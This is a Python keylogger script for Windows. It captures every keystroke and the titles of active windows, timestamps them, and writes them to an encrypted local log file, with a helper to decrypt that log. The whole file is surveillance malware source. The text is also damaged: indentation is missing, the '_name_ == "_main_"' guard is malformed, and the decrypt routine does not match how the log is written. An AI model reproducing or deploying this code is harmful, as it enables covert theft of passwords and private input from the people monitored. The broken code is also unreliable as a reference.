from pynput.keyboard import Key, Listener
from datetime import datetime
import win32gui
from cryptography.fernet import Fernet
import os
# Constants
LOG_FILE_ENCRYPTED = "keylog_encrypted.txt"
KEY_FILE = "key.key"
BUFFER_LIMIT = 10
keys = []
key_count = 0
current_window = None
# --- Encryption Functions ---
def generate_key():
"""Generate and store key if not present"""
if not os.path.exists(KEY_FILE):
key = Fernet.generate_key()
with open(KEY_FILE, 'wb') as key_file:
key_file.write(key)

def load_key():
"""Load the encryption key"""
with open(KEY_FILE, 'rb') as key_file:
return key_file.read()
def encrypt_data(data: str) -> bytes:
"""Encrypt the given string"""
key = load_key()
fernet = Fernet(key)
return fernet.encrypt(data.encode())
def decrypt_file():
"""Decrypt the encrypted keylog"""
key = load_key()
fernet = Fernet(key)
try:
with open(LOG_FILE_ENCRYPTED, 'rb') as f:
encrypted_data = f.read()
decrypted = fernet.decrypt(encrypted_data).decode()
print("\n--- Decrypted Log Content ---\n")
print(decrypted)
except Exception as e:
print(f"Error decrypting file: {e}")
# --- Logging Functions ---
def get_time():
return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def get_active_window():
try:
return win32gui.GetWindowText(win32gui.GetForegroundWindow())
except:
return "Unknown Window"

def write_file(keys):
log_data = ""
for key in keys:
k = str(key).replace("'", "")
if key == Key.space:
k = ' '
elif key == Key.enter:
k = '\n'
elif key == Key.tab:
k = '[TAB]'
elif key == Key.backspace:
k = '[BACKSPACE]'
elif key == Key.esc:
k = '[ESC]'
elif k.startswith('Key.'):
k = f'[{k.upper()}]'
log_data += k
log_data += '\n'
# Encrypt and write
encrypted = encrypt_data(log_data)
with open(LOG_FILE_ENCRYPTED, 'ab') as f:
f.write(encrypted + b'\n') # store encrypted data aslines
keys.clear()
# --- Keylogger Hooks---
def on_press(key):
global key_count, current_window
active_window = get_active_window()
if active_window != current_window:
current_window = active_window
window_info = f"\n\n[{get_time()}] - Active Window: {current_window}\n"
encrypted_window = encrypt_data(window_info)
with open(LOG_FILE_ENCRYPTED, 'ab') as f:
f.write(encrypted_window + b'\n')
keys.append(key)
key_count += 1
if key_count >= BUFFER_LIMIT:
write_file(keys)
key_count = 0
def on_release(key):
if key == Key.esc:
if keys:
write_file(keys)
return False
# --- Main Execution ---
if _name_ == "_main_":
generate_key()
print(f"Logging started at {get_time()}")
print("Press ESC to stop logging.")
with Listener(on_press=on_press, on_release=on_release) as listener:
listener.join()
